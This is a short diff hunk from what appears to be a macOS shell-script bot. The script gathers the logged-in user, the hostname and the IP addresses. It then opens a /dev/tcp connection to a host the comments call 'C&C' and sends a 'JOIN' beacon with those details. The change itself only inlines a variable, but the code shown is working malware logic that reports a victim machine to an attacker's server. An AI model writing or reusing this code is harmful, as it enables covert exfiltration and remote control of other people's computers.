@@ -21,11 +21,9 @@ user=$(stat -f "%Su" /dev/console) # Get user currently logged in (in GUI).
 hostname=$(hostname)
 ip=$(/sbin/ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1')
 
-info="$user $hostname $ip"
-
 # Send data to C&C
 exec 3<>/dev/tcp/$host/$up_port
-printf "JOIN: $info" >&3
+printf "JOIN: $user $hostname $ip" >&3
 
 function timeout() { perl -e 'alarm shift; exec @ARGV' "$@"; }
 # Print response, time out if none
